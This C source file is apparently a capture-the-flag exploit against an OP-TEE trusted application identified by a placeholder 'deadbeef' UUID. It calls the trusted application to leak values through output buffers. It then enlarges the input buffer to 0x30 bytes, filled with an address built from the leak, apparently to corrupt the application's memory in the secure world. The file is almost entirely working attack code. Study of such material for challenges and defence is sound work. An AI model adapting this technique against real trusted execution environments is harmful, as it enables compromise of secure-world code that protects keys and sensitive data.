#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "tee_client_api.h"

/*
  build libtee: https://optee.readthedocs.io/en/latest/building/gits/optee_client.html
  compile exploit: `aarch64-linux-gnu-gcc exp.c libteec.a`
*/

#define TA_DEADBEEF_UUID \
{ 0xdeadbeef, 0xdead, 0xdead, \
  { 0xde, 0xad, 0xde, 0xad, 0xde, 0xad, 0xbe, 0xef} }

int main(void)
{
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  TEEC_UUID uuid = TA_DEADBEEF_UUID;
  uint32_t err_origin;

  res = TEEC_InitializeContext(NULL, &ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  res = TEEC_OpenSession(&ctx, &sess, &uuid,
      TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
        res, err_origin);

  memset(&op, 0, sizeof(op));

  long *buf = malloc(0x20000);
  memset(buf, 0, sizeof(buf));
  buf[0] = 0x41414141;
  TEEC_TempMemoryReference tmpbuf = {
    .buffer = buf,
    .size = 0x8
  };
  long *buf2 = malloc(0x20000);
  TEEC_TempMemoryReference tmpbuf2 = {
    .buffer = buf2,
    .size = 0x8
  };
  long *buf3 = malloc(0x20000);
  TEEC_TempMemoryReference tmpbuf3 = {
    .buffer = buf3,
    .size = 0x8
  };

  // 0x665
  op.paramTypes = TEEC_PARAM_TYPES(
      TEEC_MEMREF_TEMP_INPUT,
      TEEC_MEMREF_TEMP_OUTPUT,
      TEEC_MEMREF_TEMP_OUTPUT,
      TEEC_NONE
  );

  op.params[0].tmpref = tmpbuf;
  op.params[1].tmpref = tmpbuf2;
  op.params[2].tmpref = tmpbuf3;

  res = TEEC_InvokeCommand(&sess, 0, &op, &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
        res, err_origin);

  printf("buf2: %lx, buf3: %lx\n", buf2[0], buf3[0]);

  for (int i = 1; i < 15; ++i) {
    buf[i] = buf3[0] - 0x20 + 0x200;
  }
  op.params[0].tmpref.size = 0x30;
  res = TEEC_InvokeCommand(&sess, 0, &op, &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
        res, err_origin);

  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);

  return 0;
}
